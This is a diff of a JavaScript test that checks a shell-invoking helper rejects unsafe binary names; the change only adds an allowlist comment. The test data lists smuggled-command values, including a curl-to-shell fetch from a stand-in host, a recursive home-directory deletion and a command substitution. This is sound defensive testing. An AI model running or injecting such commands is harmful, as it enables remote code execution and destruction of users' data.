@@ -94,7 +94,7 @@ describe('asking one shell about every engine', () => {
 
   // The allowlist is the same one `askShell` keeps, for the same reason: this
   // interpolates into a string a login shell runs, as them.
-  it.each(['codex; curl https://evil.sh | sh', 'codex && rm -rf ~', 'codex$(whoami)', '', 'a b'])(
+  it.each(['codex; curl https://evil.sh | sh', 'codex && rm -rf ~', 'codex$(whoami)', '', 'a b'])( // public-check: allow -- the pipe into a shell is the attack being refused here, not a thing we do
     'refuses to ask a shell about %s',
     (bin) => {
       const ran = [];
